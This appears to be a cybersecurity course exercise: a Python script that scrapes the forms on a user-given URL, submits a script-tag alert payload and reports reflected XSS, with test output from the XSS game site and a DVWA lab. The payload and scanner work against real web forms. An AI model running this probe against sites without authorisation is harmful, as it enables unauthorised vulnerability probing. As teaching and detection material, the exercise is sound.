# Ops Challenge - XSS Vulnerability Detection with Python

## Demo Code


#!/usr/bin/env python3

# Author:      Abdou Rockikz
# Description:  Testing XSS on DVWA
# Date:         Add date
# Modified by: Ray Caoagdan



# Import libraries

import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

# Declare functions


### GET FORMS FUCTION ###										
""" 
* Once given a url this function shall make a request to the 
given page and extract all HTML forms from the page.   

* BeatifulSoup is used to pull DATA out of HTML and XTML files. 
"""
def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")


### GET FORMS DETAILS FUNCTION ###
"""
 Gets the HTML forms detail  -input
form method (GET,POST,DELTE), and actions
"""
def get_form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


### SUBMIT FORM FUCTION###
"""
This function is needed to submit a form
then return the appropriate HTTP Response
"""
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)


### SCAN FUNCTION ###
"""
Once a URL is given, this function will begin 
scanning the form(s) for any XSS vulnerability
and if any are found return a True, otherwise
a False will be returned. 

1. Scan will call get_all_form to extract form data
then 
2. Next will will call get_form_details to get detailed 
form data
3. Submit form data to get a HTTP response
4. It will then check to see if XSS has been enabled 
and return the appropriate response.
"""
def scan_xss(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<script>alert('YOU HAVE BEEN HACKED')</script>"
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
    return is_vulnerable




### MAIN ###
"""
url is given here, then once given calls the
scan_xss fuction to begin the script.

"""
if __name__ == "__main__":
    url = input("Enter a URL to test for XSS:") 
    print(scan_xss(url))

### TEST ###
"""
- http://https.xss-game.appspot.com/level1/frame

OUTPUT: 
[+] Detected 1 forms on http://https.xss-game.appspot.com/level1/frame.
[+] XSS Detected on http://https.xss-game.appspot.com/level1/frame
[*] Form details:
{'action': '',
 'inputs': [{'name': 'query',
             'type': 'text',
             'value': "<script>alert('YOU HAVE BEEN HACKED')</script>"},
            {'name': None, 'type': 'submit'}],
 'method': 'get'}
True

*********************************************************

-http://dvwa.local/login.php

-OUTPUT:
[+] Detected 1 forms on http://dvwa.local/login.php.
False

"""